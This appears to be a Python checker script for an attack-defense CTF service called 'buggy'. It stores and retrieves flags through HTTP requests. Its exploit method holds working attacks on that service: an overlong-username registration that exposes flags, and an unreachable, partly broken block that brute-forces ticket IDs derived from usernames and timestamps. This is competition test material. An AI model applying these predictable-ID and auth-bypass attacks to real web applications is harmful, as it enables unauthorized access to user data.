import html
import random
import string

from enochecker import *
from enochecker.utils import sha256ify

# exploit
import re
from bs4 import BeautifulSoup as BS
from datetime import datetime, timedelta
from hashlib import sha256
from time import sleep


def random_string(amount):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(amount))


class BuggyChecker(BaseChecker):
    port = 7890
    flag_count = 1
    noise_count = 1
    havoc_count = 1

    def putflag(self) -> None:
        self.logger.debug("Starting putflag")
        username = random_string(20)
        password = random_string(20)

        # Register account
        response = self.http_post(route="/register", data={"username":username, "pw":password},
                allow_redirects=False)
        self.logger.debug("register done")

        assert_equals(302, response.status_code, "registration failed")

        cookies = response.cookies
        # TODO: Choose comment from list
        comment = "Awesome!"
        # Post Comment
        buggy = random.choice(["super", "mega"])
        response = self.http_post(route=f"/{buggy}-buggy", data={"comment":comment},
                cookies=cookies, allow_redirects=False)
        self.logger.debug("comment written")

        assert_equals(302, response.status_code, "commenting failed")

        cookies = response.cookies
        subject = random_string(20)
        # Write ticket
        response = self.http_post(route="/tickets", data={"subject":subject, "message":self.flag},
                cookies=cookies, allow_redirects=False)
        self.logger.debug("ticket written")

        assert_equals(302, response.status_code, "ticket failed")

        try:
            hash = response.headers["location"].split("/")[-1].strip()
        except Exception:
            raise BrokenServiceException("ticket redirect failed")

        assert_equals(64, len(hash), "ticket redirect failed")

        self.logger.debug(f"saving hash : {hash}")
        self.team_db[sha256ify(self.flag)] = (hash, username, password)

    def getflag(self) -> None:
        self.logger.debug("Starting getflag")
        try:
            (hash, user, password) = self.team_db[sha256ify(self.flag)]
        except KeyError as e:
            self.logger.warning(f"flag info missing, {e}")
            return Result.MUMBLE

        # Login
        response = self.http_post(route="/login", data={"username": user,
                            "pw": password}, allow_redirects=False)

        if 302 != response.status_code:
            self.logger.error(f"expected 302, got {response.status_code}")
            self.logger.error(f"login failed with user : {user} pw : {password} response : {response.text}")
            raise BrokenServiceException("getflag login failed")
        self.logger.debug("logged in")

        # TODO: View comment?

        # View ticket
        response = self.http_get(route=f"/tickets/{hash}")
        self.logger.debug("ticket loaded")

        if response.status_code != 200:
            self.logger.error(f"expected status 200, got {response.status_code}")
            raise BrokenServiceException(f"view ticket failed")
        if self.flag not in html.unescape(response.text):
            self.logger.error(f"flag {self.flag} not found in {response.text}")
            raise BrokenServiceException(f"flag not found")


    def putnoise(self) -> None:
        self.logger.info("Starting putnoise")
        pass

    def getnoise(self) -> None:
        self.logger.info("Starting getnoise")
        pass

    def havoc(self) -> None:
        self.logger.info("Starting havoc")
        try:
            pass
        except Exception:
            raise BrokenServiceException("checker failed")

    def exploit(self) -> None:
        password = random_string(20)
        u = random_string(65)
        password = "test123"

        response = self.http_post(route="/register", data={"username":u, "pw":password},
                allow_redirects=True)
        r = self.http_get(route=f"/user/itdoesntmatter", cookies=response.cookies)
        print(r.text)  # Flags in here

        return
        # Old stuff down here

        # response = self.http_post(route="/register", data={"username":u, "pw":password},
        #         allow_redirects=False)
        # r = self.http_get(route=f"/logout")
        comment = "Awesome!"
        # Post Comment
        buggy = random.choice(["super", "mega"])
        response = self.http_post(route=f"/{buggy}-buggy", data={"comment":comment},
                cookies=r.cookies, allow_redirects=False)


        # FLAG_RE = r"🏳️‍🌈\\X{4}"
        u = []
        for b in ["mega", "super"]:
            r = self.http_get(route=f"/{b}-buggy")
            s = BS(r.text, "html.parser")
            c = s.find_all(class_="comment")
            for x in c:
                t = x.find(class_="cmnt-content")
                a = x.find(class_="commenter")
                u.append((a.h3.string, t.p.string))
        username = random_string(20)
        password = random_string(20)
        response = self.http_post(route="/register", data={"username":username, "pw":password},
                allow_redirects=False)
        cookies = response.cookies
        for x in u:
            t = str(int((datetime.strptime(x[1], "%Y-%m-%d %H:%M:%S") + timedelta(hours=2)).timestamp()))
            for i in range(int(t)-10, int(t)+10):
                h = sha256()
                h.update((x[0]+str(i)).encode())
                h = h.hexdigest()
                r = self.http_get(route=f"/tickets/{h}", cookies=cookies)
                if "Ticket" in r.text or "buggy-team" in r.text:
                    fl = re.findall(FLAG_RE, r.text)
                    for f in fl:
                        print(f)

app = BuggyChecker.service

if __name__ == "__main__":
    run(BuggyChecker)
